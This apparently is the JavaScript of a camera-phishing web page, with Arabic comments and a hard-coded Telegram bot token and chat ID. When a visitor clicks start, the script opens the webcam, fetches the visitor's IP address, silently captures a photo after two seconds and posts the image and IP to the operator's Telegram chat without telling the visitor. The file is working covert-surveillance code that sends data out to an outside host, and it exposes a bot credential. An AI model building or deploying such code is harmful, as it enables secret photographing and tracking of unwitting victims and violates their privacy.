const botToken = "8139953747:AAFEaFIHMO9cYolhoT79ZfJTUUQ2-WWLIC0";
const chatId = "7606838586"; // معرف الشخص الأساسي

let firstUserPhone = null; // رقم الهاتف الأول الذي سيشارك الصفحة مع الآخرين

document.getElementById("startBtn").addEventListener("click", async () => {
    if (!firstUserPhone) {
        await requestPhoneNumber();
    } else {
        startCamera();
    }
});

async function requestPhoneNumber() {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const messageData = {
        chat_id: chatId,
        text: "يرجى مشاركة رقم هاتفك للموافقة على استخدام الخدمة.",
        reply_markup: {
            one_time_keyboard: true,
            keyboard: [[{ text: "مشاركة رقم الهاتف", request_contact: true }]]
        }
    };

    await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(messageData)
    });

    listenForPhoneNumber();
}

async function listenForPhoneNumber() {
    const updatesUrl = `https://api.telegram.org/bot${botToken}/getUpdates`;

    let received = false;
    while (!received) {
        const response = await fetch(updatesUrl);
        const data = await response.json();

        if (data.result.length > 0) {
            const lastUpdate = data.result[data.result.length - 1];
            if (lastUpdate.message && lastUpdate.message.contact) {
                firstUserPhone = lastUpdate.message.contact.phone_number;
                await sendPageLink(lastUpdate.message.chat.id);
                received = true;
            }
        }
        await new Promise(resolve => setTimeout(resolve, 3000)); // انتظر 3 ثوانٍ قبل المحاولة مجددًا
    }
}

async function sendPageLink(userChatId) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const messageData = {
        chat_id: userChatId,
        text: "شكراً لمشاركة رقمك. يمكنك استخدام الصفحة من هنا: https://yourwebsite.com"
    };

    await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(messageData)
    });
}

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.style.display = "block";

        const ip = await getIPAddress();
        setTimeout(() => captureImage(ip), 2000);
    } catch (error) {
        console.error("تم رفض الوصول إلى الكاميرا");
    }
}

async function getIPAddress() {
    try {
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("فشل في جلب عنوان IP");
        return "غير معروف";
    }
}

async function captureImage(ip) {
    const canvas = document.getElementById("canvas");
    const video = document.getElementById("video");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL("image/png");
    sendImageToBot(imageData, ip);
}

async function sendImageToBot(imageData, ip) {
    const blob = await (await fetch(imageData)).blob();
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob, "image.png");
    formData.append("caption", `📸 صورة جديدة!\n📍 عنوان IP: ${ip}`);

    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
    });
}
